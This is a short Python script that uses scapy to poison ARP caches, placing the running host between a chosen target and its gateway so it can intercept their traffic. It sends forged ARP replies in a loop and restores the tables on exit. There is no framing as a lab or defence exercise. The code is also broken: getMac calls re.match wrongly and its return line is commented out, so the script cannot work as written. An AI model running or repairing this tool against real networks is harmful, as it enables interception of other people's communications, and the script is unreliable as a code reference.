#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import sys
import inspect
import re

def getArguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
	parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
	return parser.parse_args()

def getMac(ip):
	#specify target
	arp_packet = scapy.ARP(pdst=ip)

	#set destination mac to our broadcast mac address to make sure it is sent to all clients
	broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

	#The actual packet
	arp_broadcast_packet = broadcast_packet/arp_packet

	#'srp' means send and receive packet
	answered_list = scapy.srp(arp_broadcast_packet, timeout = 1, verbose=False)
	print(answered_list)
	print(answered_list[0].show())

	re.match(answered_list[0].show())
	
	#destination hardware address(we have found our target's mac)
	#return answered_list[0][1].hwsrc

def restoreTable(destIP, sourceIP):
	destMac = getMac(destIP)
	sourceMac = getMac(sourceIP)
	packet = scapy.ARP(op=2, pdst = destIP, hwdst = destMac, psrc = sourceIP, hwsrc = sourceMac)
	scapy.send(packet)

def spoof(targetIP, spoofIP):
	target_mac = getMac(targetIP)

	#op=2 means looking for response, set the destination
	packet = scapy.ARP(op=2, pdst=targetIP, hwdst = target_mac, psrc=spoofIP)
	scapy.send(packet, verbose=False)


arguments = getArguments()
sentPackets = 0
try:
	while True:
		spoof(arguments.target, arguments.gateway)
		spoof(arguments.gateway, arguments.target)
		sentPackets += 2
		print("[+] Sent packets: " + str(sentPackets)), sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("[-] Ctrl + C detected")
	print("Restoring")
	restoreTable(arguments.target, arguments.gateway)
	restoreTable(arguments.gateway, arguments.target)






